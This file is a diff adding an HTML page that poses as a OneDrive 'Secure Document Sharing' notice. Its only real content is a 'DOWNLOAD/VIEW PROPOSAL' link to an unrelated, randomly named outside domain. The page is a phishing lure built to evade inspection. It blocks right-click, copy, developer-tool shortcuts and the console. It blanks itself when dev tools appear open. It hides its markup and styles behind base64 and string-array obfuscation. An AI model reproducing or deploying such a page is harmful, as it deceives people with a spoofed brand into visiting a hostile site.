@@ -1,0 +1,78 @@
+<!DOCTYPE html><html lang="en" oncontextmenu="return false" onselectstart="return false" ondragstart="return false"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Sharing</title>
+    <script>
+        // Disable keyboard shortcuts and dev tools
+        document.addEventListener('keydown', function(e) {
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (
+                e.keyCode == 123 || 
+                (e.ctrlKey && e.shiftKey && e.keyCode == 73) || 
+                (e.ctrlKey && e.shiftKey && e.keyCode == 74) || 
+                (e.ctrlKey && e.keyCode == 85)
+            ) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Disable right click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Anti-debugging
+        (function(){
+            function check() {
+                if (window.outerHeight - window.innerHeight > 200 || 
+                    window.outerWidth - window.innerWidth > 200) {
+                    document.body.innerHTML = 'Developer tools detected.';
+                }
+            }
+            setInterval(check, 1000);
+        })();
+
+        // Obfuscated styles (will be decoded at runtime)
+        const _0x4f8d=['c3R5bGU=','Y3JlYXRlRWxlbWVudA==','aGVhZA==','YXBwZW5kQ2hpbGQ='];
+        (function(_0x38e8d0,_0x4f8d91){const _0x593f6a=function(_0x26e9b7){while(--_0x26e9b7){_0x38e8d0['push'](_0x38e8d0['shift']());}};_0x593f6a(++_0x4f8d91);}(_0x4f8d,0x1d7));
+        const _0x593f=function(_0x38e8d0,_0x4f8d91){_0x38e8d0=_0x38e8d0-0x0;let _0x593f6a=_0x4f8d[_0x38e8d0];return atob(_0x593f6a);};
+        
+        // Load styles after page load
+        window.onload = function() {
+            const style = document.createElement(_0x593f('0x1'));
+            style.textContent = atob('Ym9keXtmb250LWZhbWlseTotYXBwbGUtc3lzdGVtLEJsaW5rTWFjU3lzdGVtRm9udCxTZWdvZSBVSSxSb2JvdG8sT3h5Z2VuLVNhbnMsVWJ1bnR1LENhbnRhcmVsbCxzYW5zLXNlcmlmO21hcmdpbjowO3BhZGRpbmc6MDtiYWNrZ3JvdW5kLWNvbG9yOiNmNWY1ZjU7Y29sb3I6IzAwMDAwMDtsaW5lLWhlaWdodDoxLjZ9aGVhZGVye2JhY2tncm91bmQtY29sb3I6I2ZmZmZmZjtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjMDAwMDAwO3BhZGRpbmc6MXJlbSAycmVtfS5zaXRlLXRpdGxle2ZvbnQtc2l6ZToxLjI1cmVtO2ZvbnQtd2VpZ2h0OjMwMDttYXJnaW46MH0uc2l0ZS10aXRsZSBhe3RleHQtZGVjb3JhdGlvbjpub25lO2NvbG9yOiMwMDAwMDB9LmNvbnRlbnR7bWF4LXdpZHRoOjEyMDBweDttYXJnaW46NHJlbSBhdXRvO3BhZGRpbmc6MCAycmVtO21pbi1oZWlnaHQ6NTB2aDtkaXNwbGF5OmdyaWQ7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOjM1JSA1NSUgMTAlO2dhcDoycmVtfS5wYWdlLXRpdGxle2ZvbnQtc2l6ZToyLjVyZW07Zm9udC13ZWlnaHQ6MzAwO21hcmdpbjowfS5tYWluLWNvbnRlbnR7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbjtnYXA6MnJlbX0uZG9jdW1lbnQtaW1hZ2V7bWF4LXdpZHRoOjEwMCU7aGVpZ2h0OmF1dG99LmRvd25sb2FkLWxpbmt7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjojMDAwMDAwO3RleHQtZGVjb3JhdGlvbjpub25lfS5kb3dubG9hZC1saW5rOmhvdmVye3RleHQtZGVjb3JhdGlvbjp1bmRlcmxpbmV9Zm9vdGVye3BhZGRpbmc6MXJlbSAycmVtO2ZvbnQtc2l6ZTowLjhyZW19');
+            document.head.appendChild(style);
+        };
+    </script>
+<style>body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,sans-serif;margin:0;padding:0;background-color:#f5f5f5;color:#000000;line-height:1.6}header{background-color:#ffffff;border-bottom:1px solid #000000;padding:1rem 2rem}.site-title{font-size:1.25rem;font-weight:300;margin:0}.site-title a{text-decoration:none;color:#000000}.content{max-width:1200px;margin:4rem auto;padding:0 2rem;min-height:50vh;display:grid;grid-template-columns:35% 55% 10%;gap:2rem}.page-title{font-size:2.5rem;font-weight:300;margin:0}.main-content{display:flex;flex-direction:column;gap:2rem}.document-image{max-width:100%;height:auto}.download-link{font-weight:bold;color:#000000;text-decoration:none}.download-link:hover{text-decoration:underline}footer{padding:1rem 2rem;font-size:0.8rem}</style></head>
+<body>
+    <div id="root"><header><h1 class="site-title"><a href="/">DOCUMENT</a></h1></header><div class="content"><div><h2 class="page-title">Secure Document Sharing</h2></div><div class="main-content"><img src="https://canto-wp-media.s3.amazonaws.com/app/uploads/2019/04/19195414/onedrive-for-business.png" alt="Document Preview" class="document-image"><p><a href="https://amazingho.battensack.com/4626-8296-b4f980e94E81zHDoK6v8qt7TLnY6z3FWhCZQ_v7fck7tEejK85ZLLzPj3uqHNVdv4POuhdh_IvKUGzFfGWv1pVyoYJEOLLutUWAPKo/Mcklzoa" class="download-link">DOWNLOAD/VIEW PROPOSAL</a></p></div><div></div></div><footer><p>Â© 2025 ONE DRIVE DOCUMENT. All rights reserved.</p></footer></div>
+    <script>
+        // Obfuscated HTML content (decoded at runtime)
+        (function() {
+            const content = atob('PGhlYWRlcj48aDEgY2xhc3M9InNpdGUtdGl0bGUiPjxhIGhyZWY9Ii8iPkRPQ1VNRU5UPC9hPjwvaDE+PC9oZWFkZXI+PGRpdiBjbGFzcz0iY29udGVudCI+PGRpdj48aDIgY2xhc3M9InBhZ2UtdGl0bGUiPlNlY3VyZSBEb2N1bWVudCBTaGFyaW5nPC9oMj48L2Rpdj48ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiPjxpbWcgc3JjPSJodHRwczovL2NhbnRvLXdwLW1lZGlhLnMzLmFtYXpvbmF3cy5jb20vYXBwL3VwbG9hZHMvMjAxOS8wNC8xOTE5NTQxNC9vbmVkcml2ZS1mb3ItYnVzaW5lc3MucG5nIiBhbHQ9IkRvY3VtZW50IFByZXZpZXciIGNsYXNzPSJkb2N1bWVudC1pbWFnZSI+PHA+PGEgaHJlZj0iaHR0cHM6Ly9hbWF6aW5naG8uYmF0dGVuc2Fjay5jb20vNDYyNi04Mjk2LWI0Zjk4MGU5NEU4MXpIRG9LNnY4cXQ3VExuWTZ6M0ZXaENaUV92N2Zjazd0RWVqSzg1WkxMelBqM3VxSE5WZHY0UE91aGRoX0l2S1VHekZmR1d2MXBWeW9ZSkVPTEx1dFVXQVBLby9NY2tsem9hIiBjbGFzcz0iZG93bmxvYWQtbGluayI+RE9XTkxPQUQvVklFVyBQUk9QT1NBTDwvYT48L3A+PC9kaXY+PGRpdj48L2Rpdj48L2Rpdj48Zm9vdGVyPjxwPsKpIDIwMjUgT05FIERSSVZFIERPQ1VNRU5ULiBBbGwgcmlnaHRzIHJlc2VydmVkLjwvcD48L2Zvb3Rlcj4=');
+            document.getElementById('root').innerHTML = content;
+        })();
+    </script>
+    <script>
+        // Additional protection measures
+        // Disable browser's view source keyboard shortcuts
+        document.onkeypress = function (event) {
+            event = (event || window.event);
+            if (event.keyCode == 123) return false;
+        }
+
+        // Disable copy-paste
+        document.addEventListener('copy', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Clear console
+        console.clear();
+        Object.defineProperty(console, '_commandLineAPI', { get : function() { throw 'Console is disabled'; } });
+    </script>
+
+</body></html>
